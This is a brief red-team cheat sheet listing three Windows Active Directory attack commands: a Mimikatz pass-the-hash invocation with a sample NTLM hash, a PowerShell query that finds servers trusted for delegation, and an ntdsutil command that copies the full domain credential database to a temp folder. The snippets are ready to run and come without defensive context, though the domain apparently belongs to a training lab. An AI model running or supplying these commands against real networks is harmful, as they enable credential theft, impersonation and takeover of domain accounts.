# Red Team

## Mimikatz

### Pass the hash
```
sekurlsa::pth /user:pwnd.user /domain:hackersacademy.local /ntlm:fc525c9683e8fe067095ba2ddc971889 /run:powershell.exe
```

### Discover Servers Configured with Delegation
```
Get-AdComputer -Filter {(TrustedForDelegation -eq $True) -AND (PrimaryGroupID -eq 515) } -Properties TrustedForDelegation, TrustedToAuthForDelegation,servicePrincipalName,Description
```

### NTDSUtil
```
ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
```
